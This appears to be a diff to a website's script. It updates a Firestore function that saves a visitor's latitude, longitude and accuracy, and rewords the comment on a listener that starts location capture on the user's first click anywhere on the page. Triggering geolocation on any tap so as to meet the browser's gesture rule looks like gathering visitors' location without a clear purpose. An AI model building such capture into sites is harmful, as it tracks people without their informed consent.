@@ -402,13 +402,18 @@ function bindContactForm(){
     } catch(e){}
   }
 }
-function saveLocation(lat, lon, acc) {
-  db.collection("locations").add({
-    lat: lat,
-    lon: lon,
-    accuracy: acc,
-    timestamp: new Date().toISOString()
-  });
+async function saveLocation(lat, lon, acc) {
+  try {
+    await addDoc(collection(db, "locations"), {
+      lat: lat,
+      lon: lon,
+      accuracy: acc,
+      timestamp: new Date().toISOString()
+    });
+    console.log("✅ Location saved!");
+  } catch (err) {
+    console.error("❌ Error saving location:", err);
+  }
 }
 
 function autoCaptureLocation() {
@@ -421,6 +426,6 @@ function autoCaptureLocation() {
   });
 }
 
-// ✅ trigger on first user tap
+// ✅ Trigger only after first tap (required by browsers)
 window.addEventListener("click", autoCaptureLocation, { once: true });
 
